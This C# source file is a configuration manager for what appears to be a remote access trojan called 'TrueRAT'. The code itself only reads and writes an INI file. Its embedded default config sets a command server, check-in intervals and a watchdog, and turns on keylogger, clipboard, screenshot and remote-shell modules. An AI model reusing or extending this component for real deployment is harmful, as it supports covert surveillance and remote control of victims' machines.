using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.IO;
namespace True.Core
{
    

    public static class ConfigManager
    {
        private static readonly string DefaultConfig = @"
[General]
server_url = http://truerat.test/
checkin_interval = 30
heartbeat_interval=7200
command_interval=30
watchdog = true
client_id = 
demo_mode = true

[Modules]
keylogger = true
clipboard = true
screenshot = true
webcam = false
remote_shell = true

[Logging]
level = verbose
";



        private static readonly Dictionary<string, Dictionary<string, string>> data = new();

        public static void Load(string path = "config.ini")
        {
            data.Clear();
            Logger.Info("ConfigManager", $"Loading config from: {Path.GetFullPath(path)}");

            if (!File.Exists(path))
            {
                Logger.Warn("ConfigManager", $"Config file not found at: {Path.GetFullPath(path)}");
                return;
            }

            string currentSection = "General";
            foreach (var line in File.ReadAllLines(path))
            {
                var trimmed = line.Trim();

                if (string.IsNullOrWhiteSpace(trimmed) || trimmed.StartsWith(";") || trimmed.StartsWith("#"))
                    continue;

                if (trimmed.StartsWith("[") && trimmed.EndsWith("]"))
                {
                    currentSection = trimmed[1..^1];
                    if (!data.ContainsKey(currentSection))
                        data[currentSection] = new Dictionary<string, string>();
                }
                else
                {
                    var parts = trimmed.Split('=', 2);
                    if (parts.Length == 2)
                    {
                        data[currentSection][parts[0].Trim()] = parts[1].Trim();
                        Logger.Debug("ConfigManager", $"Loaded [{currentSection}] {parts[0].Trim()} = {parts[1].Trim()}");
                    }
                }
            }
        }


        public static string Get(string section, string key, string fallback = "")
        {
            if (data.TryGetValue(section, out var sectionData) && sectionData.TryGetValue(key, out var value))
                return value;
            return fallback;
        }

        public static bool GetBool(string section, string key, bool fallback = false)
        {
            string val = Get(section, key, fallback.ToString());
            return val.ToLower() == "true";
        }

        public static int GetInt(string section, string key, int fallback = 0)
        {
            return int.TryParse(Get(section, key), out var result) ? result : fallback;
        }


        public static void EnsureConfigExists(string path = "config.ini")
        {
            if (!File.Exists(path))
            {
                // Create default config file
                File.WriteAllText(path,DefaultConfig);
            }

            // ALWAYS load it after ensuring existence
            Load(path);
        }


        public static void Set(string section, string key, string value)
        {
            if (!data.ContainsKey(section))
                data[section] = new Dictionary<string, string>();

            data[section][key] = value;
        }


        public static void Save(string path = "config.ini")
        {
            var sb = new StringBuilder();
            foreach (var section in data)
            {
                sb.AppendLine($"[{section.Key}]");
                foreach (var kv in section.Value)
                {
                    sb.AppendLine($"{kv.Key} = {kv.Value}");
                }
                sb.AppendLine();
            }

            File.WriteAllText(path, sb.ToString().Trim());
        }

    }

}
